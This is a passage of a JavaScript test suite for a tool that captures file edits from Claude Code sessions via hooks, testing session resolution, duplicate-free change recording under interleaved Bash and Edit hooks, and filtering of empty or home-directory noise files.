    byName.set(a, p);
  }
  assert.equal(new Set(used).size, byName.size, 'no anchor name is shared between panels');
  // The short track still has to be a coherent product story on its own.
  for (const view of ['overview', 'prompts', 'review', 'editor', 'actions']) {
    assert.ok(essentials.some((s) => s.view === view), `the short track still reaches ${view}`);
  }
});

// --- session resolution: stub transcripts must never hijack the current session ------------------
// Local commands (/effort, /model) and bridge-session records write transcript .jsonl files that
// never gain an assistant record. They must not win newest-mtime resolution over the real session.

function writeResolverTranscript(proj, id, lines, mtimeMs) {
  const p = path.join(proj, id + '.jsonl');
  fs.writeFileSync(p, lines.map((o) => JSON.stringify(o)).join('\n') + '\n');
  fs.utimesSync(p, new Date(mtimeMs), new Date(mtimeMs));
  return p;
}
function realLines(id, cwd) {
  return [
    { type: 'user', sessionId: id, cwd, message: { role: 'user', content: 'do the thing' } },
    { type: 'assistant', sessionId: id, message: { role: 'assistant', content: [{ type: 'text', text: 'ok' }] } },
  ];
}
function effortStubLines(id, cwd) {
  // faithful to a real /effort stub: user records WITH a cwd line, no assistant record ever
  return [
    { type: 'user', sessionId: id, cwd, message: { role: 'user', content: '<local-command-caveat>Caveat: local commands</local-command-caveat>' } },
    { type: 'user', sessionId: id, cwd, message: { role: 'user', content: '<command-name>/effort</command-name>' } },
    { type: 'user', sessionId: id, cwd, message: { role: 'user', content: '<local-command-stdout>Set effort level to xhigh</local-command-stdout>' } },
  ];
}

test('session: /effort-style command-only stub (with cwd) never hijacks resolution', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const T = Date.now();
  writeResolverTranscript(proj, 'real-one', realLines('real-one', cwd), T);
  writeResolverTranscript(proj, 'effort-stub', effortStubLines('effort-stub', cwd), T + 5000); // stub is NEWER
  assert.equal(core.resolveSessionId(cwd), 'real-one', 'newer command-only stub is skipped');
});

test('session: bridge-session stub never hijacks resolution', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const T = Date.now();
  writeResolverTranscript(proj, 'real-one', realLines('real-one', cwd), T);
  writeResolverTranscript(proj, 'bridge', [{ type: 'bridge-session', sessionId: 'bridge', bridgeSessionId: 'cse_x', lastSequenceNum: 0 }], T + 5000);
  assert.equal(core.resolveSessionId(cwd), 'real-one', 'bridge stub is skipped');
});

test('session: when ALL transcripts are assistant-less, fall back to the newest (never regress)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const T = Date.now();
  writeResolverTranscript(proj, 'older-stub', effortStubLines('older-stub', cwd), T);
  writeResolverTranscript(proj, 'newer-stub', effortStubLines('newer-stub', cwd), T + 5000);
  assert.equal(core.resolveSessionId(cwd), 'newer-stub', 'first-turn-in-flight project still resolves');
});

test('session: a growing transcript flips from skipped to selected once the first assistant record lands', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const T = Date.now();
  writeResolverTranscript(proj, 'real-old', realLines('real-old', cwd), T);
  // brand-new session: user prompt written, Claude has not replied yet
  const newP = writeResolverTranscript(proj, 'real-new', [
    { type: 'user', sessionId: 'real-new', cwd, message: { role: 'user', content: 'fresh prompt' } },
  ], T + 5000);
  assert.equal(core.resolveSessionId(cwd), 'real-old', 'not-yet-replied session defers to previous real session');
  // first assistant record lands (append -> mtime+size change invalidates the negative cache)
  fs.appendFileSync(newP, JSON.stringify({ type: 'assistant', sessionId: 'real-new', message: { role: 'assistant', content: [{ type: 'text', text: 'on it' }] } }) + '\n');
  fs.utimesSync(newP, new Date(T + 10000), new Date(T + 10000));
  assert.equal(core.resolveSessionId(cwd), 'real-new', 'resolution flips to the new session on first reply');
});

test('session: pasted content containing "type":"assistant" inside a user record does not count', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const T = Date.now();
  writeResolverTranscript(proj, 'real-one', realLines('real-one', cwd), T);
  writeResolverTranscript(proj, 'tricky-stub', [
    { type: 'user', sessionId: 'tricky-stub', cwd, message: { role: 'user', content: 'look at this jsonl: {"type":"assistant","message":{}}' } },
  ], T + 5000);
  assert.equal(core.resolveSessionId(cwd), 'real-one', 'substring inside pasted content is parse-rejected');
});

test('diagnose: no-assistant-yet session gets honest advice, never "restart Claude Code"', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const work = tmpWork();
  const byId = (checks, id) => checks.find((c) => c.id === id);
  core.installHooks('claude-observatory capture #' + core.HOOK_MARKER, core.settingsPath());

  // Only a command-only stub resolves (fresh project, /effort ran first): hooks must not be blamed.
  const proj = core.projectDir(work);
  fs.mkdirSync(proj, { recursive: true });
  writeResolverTranscript(proj, 'stub-only', effortStubLines('stub-only', work), Date.now());
  let checks = core.diagnose({ cwd: work, binOnPath: true, jqPresent: true });
  let c = byId(checks, 'session');
  assert.equal(c.level, 'warn');
  assert.match(c.detail, /no assistant reply yet/, 'names the real state');
  assert.match(c.fix, /hooks are fine/i, 'does not blame the hooks');
  assert.doesNotMatch(c.fix, /restart Claude Code/, 'no bogus restart advice for a stub');

  // A real session with zero edits keeps the fresh/read-only framing first.
  writeResolverTranscript(proj, 'real-one', realLines('real-one', work), Date.now() + 5000);
  checks = core.diagnose({ cwd: work, binOnPath: true, jqPresent: true });
  c = byId(checks, 'session');
  assert.equal(c.level, 'warn');
  assert.match(c.fix, /Normal for a fresh or read-only session/, 'fresh real session is not an error state');
});

// --- bash capture stat-cache memo: stat-only steady state, GC self-heal, racy-clean guard ---------

function bashHook(session, cwd, event) {
  core.handleHookPayload({ session_id: session, cwd, tool_name: 'Bash', tool_input: { command: 'x' }, hook_event_name: event });
}
const blobCount = (S) => fs.readdirSync(path.join(core.storeDir(S), 'blobs')).length;

test('capture: two Bash commands overlapping in ONE directory record a change ONCE', () => {
  // The end-to-end shape the store-level test cannot reach, and the one that matters most: a
  // backgrounded command and a foreground command in the SAME cwd both hold a snapshot from before
  // the change, so BOTH Posts would record it. Two identical rows is not just noise — undoing the
  // first then refuses as a conflict with the second, and only `--force` clears it.
  freshHome();
  const S = 'bash-overlap';
  const ws = fs.realpathSync(tmpWork());
  const F = path.join(ws, 'f.txt');
  fs.writeFileSync(F, 'v1\n');

  bashHook(S, ws, 'PreToolUse'); // command A starts (backgrounded)
  bashHook(S, ws, 'PreToolUse'); // command B starts beside it
  fs.writeFileSync(F, 'v2\n'); // …one of them changes the file
  bashHook(S, ws, 'PostToolUse'); // B finishes
  bashHook(S, ws, 'PostToolUse'); // A finishes

  const recs = core.readLog(S).filter((r) => r.file === F);
  assert.equal(recs.length, 1, `the change is recorded once, got ${recs.length}`);
  assert.equal(core.blobText(S, recs[0].beforeBlob), 'v1\n');
  assert.equal(core.blobText(S, recs[0].afterBlob), 'v2\n');
  assert.equal(core.pendingGroups(S).size, 1, 'and it is ONE decision, undoable without a conflict');
});

test('capture: a nested Bash command does not make the repo-root command re-record its change', () => {
  // The same duplicate one directory down, and the shape this repo produces all day (gradle runs in
  // packages/jetbrains beside npm at the root). Advancing only the snapshots whose root matched
  // EXACTLY left the repo-root snapshot holding the pre-change content, so its Post recorded the
  // subdirectory command's change a second time.
  freshHome();
  const S = 'bash-nested';
  const ws = fs.realpathSync(tmpWork());
  const sub = path.join(ws, 'pkg');
  fs.mkdirSync(sub, { recursive: true });
  const F = path.join(sub, 'f.txt');
  fs.writeFileSync(F, 'v1\n');

  bashHook(S, ws, 'PreToolUse'); // the repo-root command starts (backgrounded)
  bashHook(S, sub, 'PreToolUse'); // a command in the subdirectory starts beside it
  fs.writeFileSync(F, 'v2\n'); // …which changes a file there
  bashHook(S, sub, 'PostToolUse'); // it finishes and records the change
  bashHook(S, ws, 'PostToolUse'); // the repo-root command finishes

  const recs = core.readLog(S).filter((r) => r.file === F);
  assert.equal(recs.length, 1, `the change is recorded once, got ${recs.length}`);
  assert.equal(core.pendingGroups(S).size, 1, 'and it is ONE decision, undoable without a conflict');
});

test('capture: advancing a snapshot never adds a file from OUTSIDE its own tree', () => {
  // Containment cuts both ways. A repo-root command that records a NEW file must not write that key
  // into a sibling subtree's pending snapshot: that command's Post walks a tree the file was never
  // in, finds the key unseen, and reports it DELETED — inventing the very phantom this removes.
  freshHome();
  const S = 'bash-sibling';
  const ws = fs.realpathSync(tmpWork());
  const a = path.join(ws, 'a');
  const b = path.join(ws, 'b');
  fs.mkdirSync(a, { recursive: true });
  fs.mkdirSync(b, { recursive: true });
  fs.writeFileSync(path.join(a, 'keep.txt'), 'stay\n');

  bashHook(S, a, 'PreToolUse'); // a command scoped to a/ starts
  bashHook(S, ws, 'PreToolUse'); // a repo-root command starts beside it
  const fresh = path.join(b, 'new.txt');
  fs.writeFileSync(fresh, 'brand new\n'); // created under b/, which a/'s walk never visits
  bashHook(S, ws, 'PostToolUse'); // the root command records the creation
  // Read a/'s snapshot while it is STILL PENDING — after its Post consumes it there is nothing left
  // to inspect, and an assertion over the empty set passes against any implementation at all.
  const aSnapshot = core.readBashManifest(S, a);
  assert.ok(aSnapshot, 'a/ still has its snapshot to diff against');
  assert.ok(
    !Object.prototype.hasOwnProperty.call(aSnapshot.files ?? {}, fresh),
    'and it never gained a key for a file outside its own tree'
  );
  bashHook(S, a, 'PostToolUse'); // a/'s command finishes

  const recs = core.readLog(S).filter((r) => r.file === fresh);
  assert.equal(recs.length, 1, 'the creation is recorded once');
  assert.equal(recs[0].beforeBlob, null, 'as a creation');
  assert.ok(
    !core.readLog(S).some((r) => r.file === fresh && r.afterBlob === null),
    'and a/ never reports it deleted'
  );
});

test('capture: a file CREATED under an overlapping command is recorded once', () => {
  // The add path of the advance, which the change-shaped test above cannot reach: two commands in one
  // directory straddle a creation, so both snapshots lack the file and both Posts would report it new.
  freshHome();
  const S = 'bash-create-overlap';
  const ws = fs.realpathSync(tmpWork());
  const F = path.join(ws, 'made.txt');
  bashHook(S, ws, 'PreToolUse');
  bashHook(S, ws, 'PreToolUse');
  fs.writeFileSync(F, 'brand new\n');
  bashHook(S, ws, 'PostToolUse');
  bashHook(S, ws, 'PostToolUse');
  const recs = core.readLog(S).filter((r) => r.file === F);
  assert.equal(recs.length, 1, `the creation is recorded once, got ${recs.length}`);
  assert.equal(recs[0].beforeBlob, null, 'as a creation');
});

test('capture: a file DELETED under an overlapping command is recorded once', () => {
  // …and the remove path: both snapshots hold the file, so both Posts would report the deletion.
  freshHome();
  const S = 'bash-delete-overlap';
  const ws = fs.realpathSync(tmpWork());
  const F = path.join(ws, 'doomed.txt');
  fs.writeFileSync(F, 'bye\n');
  bashHook(S, ws, 'PreToolUse');
  bashHook(S, ws, 'PreToolUse');
  fs.unlinkSync(F);
  bashHook(S, ws, 'PostToolUse');
  bashHook(S, ws, 'PostToolUse');
  const recs = core.readLog(S).filter((r) => r.file === F);
  assert.equal(recs.length, 1, `the deletion is recorded once, got ${recs.length}`);
  assert.equal(recs[0].afterBlob, null, 'as a deletion');
});

test('capture: a file under the root but OUTSIDE the walk is never reported deleted', () => {
  // The trap in advancing by containment: `isUnderPath` is a path test, but the walk does not reach
  // everything under its root — it refuses to descend BASH_SKIP_DIRS (`build`, `node_modules`, …),
  // symlinked directories and unreadable ones. So a change recorded by a command INSIDE `build/`
  // added a key the repo-root snapshot's own walk could never see, and its Post called the file
  // deleted. Worse than a stray row: the pair chains into "file deleted", and undoing the real
  // change then refuses as a conflict — the exact failure the advance was written to prevent.
  freshHome();
  const S = 'bash-skipdir';
  const ws = fs.realpathSync(tmpWork());
  const skipped = path.join(ws, 'build'); // in BASH_SKIP_DIRS — the root walk never descends it
  fs.mkdirSync(skipped, { recursive: true });
  const F = path.join(skipped, 'x.txt');
  fs.writeFileSync(F, 'v1\n');

  bashHook(S, ws, 'PreToolUse'); // repo-root command starts (its walk skips build/)
  bashHook(S, skipped, 'PreToolUse'); // a command inside build/ starts
  fs.writeFileSync(F, 'v2\n');
  bashHook(S, skipped, 'PostToolUse'); // records v1→v2 and advances the root snapshot
  bashHook(S, ws, 'PostToolUse'); // the root command finishes — must NOT invent a deletion

  const recs = core.readLog(S).filter((r) => r.file === F);
  assert.equal(recs.length, 1, `one record, got ${recs.length}: ${JSON.stringify(recs.map((r) => [r.beforeBlob, r.afterBlob]))}`);
  assert.ok(!recs.some((r) => r.afterBlob === null), 'and nothing claims the file was deleted');
  assert.equal(fs.readFileSync(F, 'utf8'), 'v2\n', 'the file is still on disk, which is the whole point');
});

test('capture: a real deletion IS still recorded (the guard above must not swallow one)', () => {
  // The positive control for the existence guard: prove the instrument still fires.
  freshHome();
  const S = 'bash-realdel';
  const ws = fs.realpathSync(tmpWork());
  const F = path.join(ws, 'gone.txt');
  fs.writeFileSync(F, 'bye\n');
  bashHook(S, ws, 'PreToolUse');
  fs.unlinkSync(F);
  bashHook(S, ws, 'PostToolUse');
  const recs = core.readLog(S).filter((r) => r.file === F);
  assert.equal(recs.length, 1, 'the deletion is recorded');
  assert.equal(recs[0].afterBlob, null, 'as a deletion');
});

test('capture: a previous build’s rootless snapshot never answers for a subdirectory', () => {
  // The upgrade path. The old build wrote ONE shared `__bash__.json` with no root, and a rootless
  // manifest matched any cwd — it even sorts first, so the first Post after an upgrade consumed it
  // and reported every file outside its own directory as deleted.
  freshHome();
  const S = 'bash-legacy';
  const ws = fs.realpathSync(tmpWork());
  const sub = path.join(ws, 'packages');
  fs.mkdirSync(sub, { recursive: true });
  fs.writeFileSync(path.join(ws, 'README.md'), 'readme\n');
  fs.writeFileSync(path.join(sub, 'a.txt'), 'a\n');
  // A legacy snapshot of the whole tree, with no `root` — exactly what the shipped build wrote.
  core.ensureStore(S);
  core.writeBashManifest(S, {
    files: { [path.join(ws, 'README.md')]: core.writeBlob(S, Buffer.from('readme\n')) },
    ts: Date.now(),
  });
  bashHook(S, sub, 'PreToolUse');
  bashHook(S, sub, 'PostToolUse'); // a command in packages/ that changed nothing
  assert.deepEqual(core.readLog(S), [], 'no phantom deletions for files outside that command’s tree');
});

test('capture: NO INTERLEAVING of Bash and Edit records one change twice', () => {
  // The standing guard against duplicate rows. Hooks arrive interleaved because a backgrounded Bash
  // command runs beside the next tool call, so every ordering below happens in a normal session —
  // and each one had a way to log the same disk transition twice, which shows up as two rows with
  // identical deltas and consecutive ids, and makes undoing the first refuse as a conflict.
  //
  // The invariant is stronger than "no duplicate row": a file's records must form a CHAIN that ends
  // on what is actually on disk. That catches a missing capture as loudly as a doubled one.
  const chainOf = (S, file) => {
    const recs = core.readLog(S).filter((r) => r.file === file).sort((a, b) => a.id - b.id);
    for (let i = 1; i < recs.length; i++) {
      assert.equal(recs[i].beforeBlob, recs[i - 1].afterBlob, `#${recs[i].id} does not continue #${recs[i - 1].id}`);
    }
    const last = recs[recs.length - 1];
    if (last) {
      const onDisk = fs.existsSync(file) ? fs.readFileSync(file, 'utf8') : null;
      assert.equal(last.afterBlob === null ? null : core.blobText(S, last.afterBlob), onDisk, 'the chain ends on what is on disk');
    }
    return recs;
  };
  const bash = (S, cwd, event) =>
    core.handleHookPayload({ session_id: S, cwd, tool_name: 'Bash', tool_input: { command: 'x' }, hook_event_name: event });
  const edit = (S, cwd, file, event) =>
    core.handleHookPayload({ session_id: S, cwd, tool_name: 'Edit', tool_input: { file_path: file }, hook_event_name: event });

  {
    // 1. A backgrounded command's Post lands in the MIDDLE of an edit. Its walk sees the new content
    //    while the edit's own Post is still coming — both used to record it.
    freshHome();
    const S = 'ilv-bash-mid-edit';
    const ws = fs.realpathSync(tmpWork());
    const F = path.join(ws, 'a.ts');
    fs.writeFileSync(F, 'v0\n');
    bash(S, ws, 'PreToolUse');
    edit(S, ws, F, 'PreToolUse');
    fs.writeFileSync(F, 'v1\n');
    bash(S, ws, 'PostToolUse');
    edit(S, ws, F, 'PostToolUse');
    const recs = chainOf(S, F);
    assert.equal(recs.length, 1, `one change, one record — got ${recs.length}`);
    assert.equal(recs[0].tool, 'Edit', 'and it is attributed to the tool that made it');
  }
  {
    // 2. The same pair, the other way round: the edit finishes first and the command's Post walks
    //    after it. (The snapshot advance covers this one.)
    freshHome();
    const S = 'ilv-edit-then-bash';
    const ws = fs.realpathSync(tmpWork());
    const F = path.join(ws, 'a.ts');
    fs.writeFileSync(F, 'v0\n');
    bash(S, ws, 'PreToolUse');
    edit(S, ws, F, 'PreToolUse');
    fs.writeFileSync(F, 'v1\n');
    edit(S, ws, F, 'PostToolUse');
    bash(S, ws, 'PostToolUse');
    assert.equal(chainOf(S, F).length, 1, 'one change, one record');
  }
  {
    // 3. One backgrounded command spanning SEVERAL edits, to two files.
    freshHome();
    const S = 'ilv-span';
    const ws = fs.realpathSync(tmpWork());
    const A = path.join(ws, 'a.ts');
    const B = path.join(ws, 'b.ts');
    fs.writeFileSync(A, 'a0\n');
    fs.writeFileSync(B, 'b0\n');
    bash(S, ws, 'PreToolUse');
    for (const [f, v] of [[A, 'a1\n'], [B, 'b1\n'], [A, 'a2\n']]) {
      edit(S, ws, f, 'PreToolUse');
      fs.writeFileSync(f, v);
      edit(S, ws, f, 'PostToolUse');
    }
    bash(S, ws, 'PostToolUse');
    assert.equal(chainOf(S, A).length, 2, 'two edits to a.ts, two records');
    assert.equal(chainOf(S, B).length, 1, 'one edit to b.ts, one record');
  }
  {
    // 4. Nested roots overlapping, and the command itself does the writing (no edit tool at all).
    freshHome();
    const S = 'ilv-nested';
    const ws = fs.realpathSync(tmpWork());
    const sub = path.join(ws, 'packages');
    fs.mkdirSync(sub, { recursive: true });
    const F = path.join(sub, 'c.ts');
    fs.writeFileSync(F, 'c0\n');
    bash(S, ws, 'PreToolUse');
    bash(S, sub, 'PreToolUse');
    fs.writeFileSync(F, 'c1\n');
    bash(S, sub, 'PostToolUse');
    bash(S, ws, 'PostToolUse');
    assert.equal(chainOf(S, F).length, 1, 'one change, one record');
  }
  {
    // 5. …and the capture is not merely silent: a command that really does change a file on its own
    //    still records it (the positive control for every skip above).
    freshHome();
    const S = 'ilv-control';
    const ws = fs.realpathSync(tmpWork());
    const F = path.join(ws, 'd.ts');
    fs.writeFileSync(F, 'd0\n');
    bash(S, ws, 'PreToolUse');
    fs.writeFileSync(F, 'd1\n');
    bash(S, ws, 'PostToolUse');
    const recs = chainOf(S, F);
    assert.equal(recs.length, 1, 'the command’s own change is recorded');
    assert.equal(recs[0].tool, 'Bash');
  }
});

test('capture: an ABANDONED edit does not suppress the file forever', () => {
  // The other side of deferring to an in-flight edit. Nothing reaps a staging record whose Post never
  // arrived (an interrupted edit), and deferring to it indefinitely would mean every later change to
  // that file went unrecorded — silently, which is worse than the duplicate the deferral prevents.
  freshHome();
  const S = 'stale-staging';
  const ws = fs.realpathSync(tmpWork());
  const F = path.join(ws, 'a.ts');
  fs.writeFileSync(F, 'v0\n');
  // An edit call that starts and never finishes.
  core.handleHookPayload({ session_id: S, cwd: ws, tool_name: 'Edit', tool_input: { file_path: F }, hook_event_name: 'PreToolUse' });
  const staging = fs.readdirSync(path.join(core.storeDir(S), 'staging')).filter((n) => n.endsWith('.json'));
  assert.equal(staging.length, 1, 'the before-snapshot is waiting');
  // Age it past the in-flight horizon, then let a Bash command see the change.
  const old = Date.now() - 10 * 60 * 1000;
  fs.utimesSync(path.join(core.storeDir(S), 'staging', staging[0]), old / 1000, old / 1000);
  core.handleHookPayload({ session_id: S, cwd: ws, tool_name: 'Bash', tool_input: { command: 'x' }, hook_event_name: 'PreToolUse' });
  fs.writeFileSync(F, 'v1\n');
  core.handleHookPayload({ session_id: S, cwd: ws, tool_name: 'Bash', tool_input: { command: 'x' }, hook_event_name: 'PostToolUse' });
  const recs = core.readLog(S).filter((r) => r.file === F);
  assert.equal(recs.length, 1, 'the change is still recorded — by the walk, since nothing else will');
  assert.equal(core.blobText(S, recs[0].afterBlob), 'v1\n');
});

test('capture: a change the in-flight edit will NOT cover is still recorded', () => {
  // The other half of the deferral's safety. If the command changed the file BEFORE the edit's Pre
  // ran, that edit's before-snapshot is the command's output — so its Post records a narrower hop and
  // the earlier content would never be recorded by anyone. Deferring is only safe when the edit is
  // covering this walk's own transition, which its before-blob is what proves.
  freshHome();
  const S = 'edit-after-write';
  const ws = fs.realpathSync(tmpWork());
  const F = path.join(ws, 'a.ts');
  fs.writeFileSync(F, 'v0\n');
  const bash = (ev) => core.handleHookPayload({ session_id: S, cwd: ws, tool_name: 'Bash', tool_input: { command: 'x' }, hook_event_name: ev });
  const edit = (ev) => core.handleHookPayload({ session_id: S, cwd: ws, tool_name: 'Edit', tool_input: { file_path: F }, hook_event_name: ev });
  bash('PreToolUse'); // snapshot at v0
  fs.writeFileSync(F, 'v1\n'); // the COMMAND writes it…
  edit('PreToolUse'); // …and only then does an edit start, snapshotting v1
  fs.writeFileSync(F, 'v2\n');
  bash('PostToolUse'); // the walk sees v0→v2; the edit will only ever cover v1→v2
  edit('PostToolUse');
  const recs = core.readLog(S).filter((r) => r.file === F).sort((a, b) => a.id - b.id);
  assert.equal(core.blobText(S, recs[0].beforeBlob), 'v0\n', 'the chain still reaches v0 — nothing was dropped');
  assert.equal(core.blobText(S, recs[recs.length - 1].afterBlob), 'v2\n', 'and it ends on what is on disk');
  for (let i = 1; i < recs.length; i++) {
    assert.equal(recs[i].beforeBlob, recs[i - 1].afterBlob, 'the chain is unbroken');
  }
});

test('capture: a DENIED edit does not blind the walk to the file', () => {
  // PreToolUse runs before the permission prompt and PostToolUse only fires on success, so a denied
  // or failed edit leaves its before-snapshot behind. Deferring to one of those is how a file that is
  // genuinely changing goes unrecorded with nothing said — the reason the window is seconds, not
  // minutes, and the reason the deferral also demands a covering before-blob.
  freshHome();
  const S = 'denied-edit';
  const ws = fs.realpathSync(tmpWork());
  const F = path.join(ws, 'a.ts');
  fs.writeFileSync(F, 'v0\n');
  // The edit is proposed and denied: its Pre ran, its Post never will.
  core.handleHookPayload({ session_id: S, cwd: ws, tool_name: 'Edit', tool_input: { file_path: F }, hook_event_name: 'PreToolUse' });
  const bash = (ev) => core.handleHookPayload({ session_id: S, cwd: ws, tool_name: 'Bash', tool_input: { command: 'x' }, hook_event_name: ev });
  bash('PreToolUse');
  fs.writeFileSync(F, 'v1\n'); // a command changes the very file the denied edit had staged
  bash('PostToolUse');
  const recs = core.readLog(S).filter((r) => r.file === F);
  assert.equal(recs.length, 1, 'the command’s change is recorded, not swallowed by a dead staging record');
  assert.equal(core.blobText(S, recs[0].beforeBlob), 'v0\n', 'and it reaches the content that existed before it');
});

test('capture: randomised hook interleavings never duplicate a change (seeded fuzz)', () => {
  // The five hand-written orderings above are the ones we thought of. This drives many more: several
  // Bash windows open at once across nested roots, edit calls landing inside them, and a command's
  // Post landing BETWEEN an edit's Pre and its Post — the ordering that produced the reported rows.
  //
  // Seeded, so a failure is reproducible. Instrument checked by mutation: with the already-recorded
  // check removed this reports 22 duplicate pairs over these runs, so a green result means the
  // generator really is producing the interleaving, not missing it.
  let seed = 12345;
  const rnd = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
  const pick = (a) => a[Math.floor(rnd() * a.length)];
  let dups = 0;
  let breaks = 0;
  let mismatches = 0;
  let records = 0;
  for (let iter = 0; iter < 12; iter++) {
    freshHome();
    const ws = fs.realpathSync(tmpWork());
    const dirs = [ws, path.join(ws, 'packages'), path.join(ws, 'packages', 'core')];
    for (const d of dirs) fs.mkdirSync(d, { recursive: true });
    const files = dirs.map((d, i) => path.join(d, `f${i}.ts`));
    files.forEach((f, i) => fs.writeFileSync(f, `start ${i}\n`));
    const S = `fuzz${iter}`;
    const hook = (cwd, tool, event, file) =>
      core.handleHookPayload({
        session_id: S, cwd, tool_name: tool, hook_event_name: event,
        tool_input: tool === 'Bash' ? { command: 'x' } : { file_path: file },
      });
    const open = [];
    let v = 0;
    for (let step = 0; step < 24; step++) {
      const r = rnd();
      if (r < 0.3) {
        const d = pick(dirs);
        hook(d, 'Bash', 'PreToolUse');
        open.push(d);
      } else if (r < 0.5 && open.length) {
        hook(open.shift(), 'Bash', 'PostToolUse');
      } else {
        const f = pick(files);
        hook(path.dirname(f), 'Edit', 'PreToolUse', f);
        fs.writeFileSync(f, `start x\nv${++v}\n`);
        if (rnd() < 0.5 && open.length) hook(open.shift(), 'Bash', 'PostToolUse'); // mid-edit
        hook(path.dirname(f), 'Edit', 'PostToolUse', f);
      }
    }
    while (open.length) hook(open.shift(), 'Bash', 'PostToolUse');
    for (const f of files) {
      const recs = core.readLog(S).filter((r) => r.file === f).sort((a, b) => a.id - b.id);
      records += recs.length;
      for (let i = 1; i < recs.length; i++) {
        if (recs[i].beforeBlob === recs[i - 1].beforeBlob && recs[i].afterBlob === recs[i - 1].afterBlob) dups++;
        if (recs[i].beforeBlob !== recs[i - 1].afterBlob) breaks++;
      }
      const last = recs[recs.length - 1];
      if (last) {
        const disk = fs.existsSync(f) ? fs.readFileSync(f, 'utf8') : null;
        if ((last.afterBlob === null ? null : core.blobText(S, last.afterBlob)) !== disk) mismatches++;
      }
    }
  }
  assert.ok(records > 100, `the fuzz actually captured something (${records} records)`);
  assert.equal(dups, 0, `${dups} duplicate record pairs`);
  assert.equal(breaks, 0, `${breaks} broken chains — a capture went missing`);
  assert.equal(mismatches, 0, `${mismatches} chains that do not end on what is on disk`);
});

test('capture: losing a file’s final newline is a real edit, not blank-line churn', () => {
  // `split('\n')` makes a trailing terminator look like an empty last line, so the blank-line filter
  // compared "two\n" equal to "two" — and the change vanished end to end: no record, no marker,
  // nothing to undo, while git calls it out as `\ No newline at end of file` and linters fail on it.
  freshHome();
  const S = 'final-nl';
  const ws = fs.realpathSync(tmpWork());
  const F = path.join(ws, 'f.txt');
  fs.writeFileSync(F, 'one\ntwo\n');
  const hook = (event) =>
    core.handleHookPayload({ session_id: S, cwd: ws, tool_name: 'Write', tool_input: { file_path: F }, hook_event_name: event });
  hook('PreToolUse');
  fs.writeFileSync(F, 'one\ntwo'); // ONLY the final newline goes
  hook('PostToolUse');
  const recs = core.readLog(S).filter((r) => r.file === F);
  assert.equal(recs.length, 1, 'the edit is recorded');
  assert.equal(core.blobText(S, recs[0].afterBlob), 'one\ntwo', 'with the newline genuinely gone');

  // …and real blank-line churn is still not a row.
  hook('PreToolUse');
  fs.writeFileSync(F, 'one\n\n\ntwo');
  hook('PostToolUse');
  assert.equal(core.readLog(S).filter((r) => r.file === F).length, 1, 'blank lines alone still never earn a decision');
});

test('capture: a Bash command that creates ZERO-BYTE files records no "+0 −0" rows', () => {
  // The shape observed in a real store: 2,241 of 2,446 records had an EMPTY after-blob — postgres
  // relation stubs from `initdb`, plus .Xauthority, .tig_history, btmp. Every one rendered as
  // "+0 −0" with nothing behind it, so 91.6% of the review list was rows with nothing to review.
  freshHome();
  const S = 'bash-empty';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, 'kept.ts'), 'one\n');
  bashHook(S, cwd, 'PreToolUse');
  // What a build/install step leaves behind: a dozen empty stubs and one file with real content.
  for (let i = 0; i < 12; i++) fs.writeFileSync(path.join(cwd, `stub${i}.dat`), '');
  fs.writeFileSync(path.join(cwd, 'real.ts'), 'a\nb\nc\n');
  fs.writeFileSync(path.join(cwd, 'kept.ts'), 'one\ntwo\n');
  bashHook(S, cwd, 'PostToolUse');

  const files = core.readLog(S).map((r) => path.basename(r.file)).sort();
  assert.deepEqual(files, ['kept.ts', 'real.ts'],
    'only the two files with content are recorded — the twelve empty stubs are not');
  // Not swallowed: one marker per command, naming the count.
  const marker = core.readSkips(S).find((k) => k.file === '<bash-empty>');
  assert.ok(marker, 'silence is not an option — the command says what it dropped');
  assert.match(marker.reason, /^12 zero-byte file/, 'and how many');

  // An empty file that DISAPPEARS is the same non-event, and must not become a "+0 −0" deletion.
  bashHook(S, cwd, 'PreToolUse');
  for (let i = 0; i < 12; i++) fs.rmSync(path.join(cwd, `stub${i}.dat`));
  fs.rmSync(path.join(cwd, 'real.ts'));
  bashHook(S, cwd, 'PostToolUse');
  const after = core.readLog(S).filter((r) => r.afterBlob === null).map((r) => path.basename(r.file));
  assert.deepEqual(after, ['real.ts'], 'the file with content is a real deletion; the stubs are not');
});

test('capture: an Edit that creates an empty file IS recorded — the guard is Bash-only', () => {
  // The positive control that keeps the fix honest. A zero-byte file Claude wrote ON PURPOSE is a
  // real edit; only the Bash tree walk's INFERRED side effects are filtered.
  freshHome();
  const S = 'bash-empty-control';
  const cwd = tmpWork();
  const f = path.join(cwd, 'touched.txt');
  core.handleHookPayload({ session_id: S, cwd, tool_name: 'Write', tool_input: { file_path: f }, hook_event_name: 'PreToolUse' });
  fs.writeFileSync(f, '');
  core.handleHookPayload({ session_id: S, cwd, tool_name: 'Write', tool_input: { file_path: f }, hook_event_name: 'PostToolUse' });
  const log = core.readLog(S);
  assert.equal(log.length, 1, 'a deliberate Write of an empty file is still an edit');
  assert.equal(log[0].tool, 'Write');
});

test('capture: Bash in $HOME snapshots nothing, and SAYS it captured nothing', () => {
  // The observed damage: a real session that ran `install neovim` from the home directory recorded
  // 2,445 Bash "edits" — .Xauthority, .CFUserTextEncoding, .bash_history, shell state — against one
  // real Write. None were changes the agent made. The review list was 99.8% noise and the store held
  // a snapshot of the user's home directory.
  freshHome();
  const S = 'bash-home';
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'fakehome-'));
  const realHome = os.homedir;
  os.homedir = () => home;
  try {
    fs.writeFileSync(path.join(home, '.bash_history'), 'one\n');
